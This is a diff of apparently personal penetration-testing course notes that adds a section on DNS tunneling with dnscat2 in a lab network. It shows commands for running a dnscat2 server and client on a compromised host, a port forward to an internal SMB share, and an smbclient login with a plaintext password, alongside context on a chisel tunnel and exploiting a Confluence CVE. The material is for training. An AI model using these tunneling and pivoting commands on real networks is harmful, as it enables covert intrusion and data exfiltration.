@@ -1686,7 +1686,7 @@ Reference
     `sudo apt install ncat`
   - successfull ssh through chisel HTTP tunnel  
     `ssh -o ProxyCommand='ncat --proxy-type socks5 --proxy 127.0.0.1:1080 %h %p' database_admin@10.4.50.215`
-- DNS Tunneling
+- DNS Tunneling fundamentals
   ```
   Pivot through CONFLUENCE01 (compromise CONFLUENCE01 by exploiting CVE-2022-26134) and ssh to PGDATABASE01
   Reverse shell payload and create an SSH remote port forward to relay a port on our Kali machine to the SSH service on PGDATABASE01
@@ -1737,7 +1737,38 @@ Reference
     www.feline.corp	text = "here's something useful!"
     www.feline.corp	text = "here's something else less useful."
     ```
-- 
+- DNS tunneling with dbscat2
+  - Starting tcpdump to listen for packets on UDP port 53  
+    `kali@felineauthority:~$ sudo tcpdump -i ens192 udp port 53`
+  - Starting the dnscat2 server. > Starting Dnscat2 DNS server on 0.0.0.0:53  
+    `kali@felineauthority:~$ dnscat2-server feline.corp`
+  - move to PGDATABASE01 to run the dnscat2 client binary (could transfer from kali to PGDATABASE01 via SCP) > session established  
+    ```
+    database_admin@pgdatabase01:~$ cd dnscat/
+    database_admin@pgdatabase01:~/dnscat$ ./dnscat feline.corp
+    ```
+  - check for connection from dnscat2 client.  
+    ```
+    kali@felineauthority:~$ dnscat2-server feline.corp
+    dnscat2> New window created: 1
+    ```
+  - use our tcpdump process to monitor the DNS requests to feline.corp v  
+    ```
+    07:22:19.783146 IP 192.168.118.4.domain > 192.168.50.64.50186: 58205 1/0/0 TXT "2b4c0140b608687c966b10ffff0866c42a" (111)
+    07:22:20.438134 IP 192.168.50.64.65235 > 192.168.118.4.domain: 52335+ CNAME? b9740158e00bc5bfbe3eb81e16454173b8.feline.corp. (64)
+    ```
+  - Interacting with the dnscat2 client from the server  
+    ```
+    dnscat2> windows
+    dnscat2> window -i 1
+    command (pgdatabase01) 1> ?
+    command (pgdatabase01) 1> listen --help
+    ```
+  - Setting up a port forward from FELINEAUTHORITY to PGDATABASE01  
+    `command (pgdatabase01) 1> listen 127.0.0.1:4455 172.16.2.11:445` (listening on 4455 on the loopback interface of FELINEAUTHORITY, and forwarding to 445 on HRSHARES)  
+  - another shell Connecting to HRSHARES's SMB server through the dnscat2 port forward  
+    `kali@felineauthority:~$ smbclient -p 4455 -L //127.0.0.1 -U hr_admin --password=Welcome1234`  
+
 ### 21. The metassploit framework
 ### 22. Active directory introduction and enumeration
 ### 23. Attacking active drectiory authentication
